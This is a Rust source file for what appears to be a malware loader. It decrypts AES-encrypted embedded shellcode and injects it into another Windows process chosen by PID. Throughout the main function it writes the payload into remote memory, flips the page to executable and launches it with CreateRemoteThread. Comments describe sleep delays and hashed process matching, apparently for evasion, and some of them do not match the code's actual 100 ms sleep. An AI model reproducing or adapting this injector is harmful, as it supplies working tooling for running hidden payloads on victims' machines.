
use libaes::Cipher;

// Importing shellcode variables from shellcode.rs
mod shellcode;
use shellcode::{SHELLCODE, KEY, INITVEC};

// Importing required syscall wrappers from syscall.rs:
mod syscalls;
use syscalls::*;

struct EncryptedShellcode<'a> {
    shellcode: &'a[u8],
    key: [u8; 32],
    iv: [u8; 16],
}

impl EncryptedShellcode<'_> { 
    fn decrypt(&self) -> Vec<u8> {
        let cipher = Cipher::new_256(&self.key);
        cipher.cbc_decrypt(&self.iv, &self.shellcode)
    }
}



// The current execution flow idea is as follows:
// This program starts, it sleeps for 30 seconds.
// After sleeping, it'll look for a specified process 
// by matching hashed names against a hash.
// If it finds the specified process, it'll allocate
// a new block of WRITE space, where it´ll write and drop a payload.
// Now, after sleeping for 10 seconds, this will turn the page to EXECUTE
// and start the thread execution. Now, we close the handle(s) and continue our lives.

fn main() {
    let encrypted_payload = EncryptedShellcode{
        shellcode: SHELLCODE, 
        key: KEY, 
        iv: INITVEC
    };
    let payload = encrypted_payload.decrypt();
    /*
    let pids = enumerate_processes().unwrap();
    let current_process_pid = pids.last().unwrap();
    //let args: Vec<String> = env::args().collect();
    */
    let args: Vec<String> = std::env::args().collect();

    // Ensure at least one argument (the program name) is provided
    if args.len() < 2 {
        println!("Usage: {} <number>", args[0]);
        return;
    }

    // Parse the argument into a usize
    let target_pid: usize = match args[1].parse() {
        Ok(num) => num,
        Err(_) => {
            println!("Error: Invalid input! Defaulting to 0.");
            0
        }
    };    let mut current_process = WindowsProcess::from_pid(target_pid);
    // Now, technically we shouldn't need to fetch a handle, as it'll do it automatically.
    let address_start = match current_process.virtual_alloc(
        None, 
        Some(0x04),
        Some(payload.len()),
        None
    ) {
        Ok(address)  => { 
            println!("[+] VirtualAlloc succeeded."); 
            address
        },
        Err(e) => panic!("[!] VirtualAlloc error!\n-> {:#x}", e.0),
    };
    match current_process.write_process_memory(
        address_start as usize, 
        payload.to_vec()
    ){
        Ok(_) => println!("[+] WriteProcessMemory succeeded."),
        Err(e) => eprintln!("[!] WriteProcessMemory error!\n-> {:#x}", e.0),
    }

    match current_process.virtual_protect(
        address_start, 
        payload.len(), 
        0x10
    ){
        Ok(_) => println!("[+] VirtualProtectEx succeeded."),
        Err(e) => eprintln!("[!] VirtualProtectEx error!\n-> {:#x}", e.0),
    }
    match current_process.create_remote_thread_ex(
        address_start
    ){
        Ok(_) => println!("[+] CreateRemoteThread succeeded."),
        Err(e) => eprintln!("[!] CreateRemoteThread error!\n-> {:#x}", e.0),
    }
    // This is used to test that the thread does spawn, as the process terminates too quickly otherwise.
    use std::{thread, time};
    let ten_millis = time::Duration::from_millis(100);
    thread::sleep(ten_millis);

}
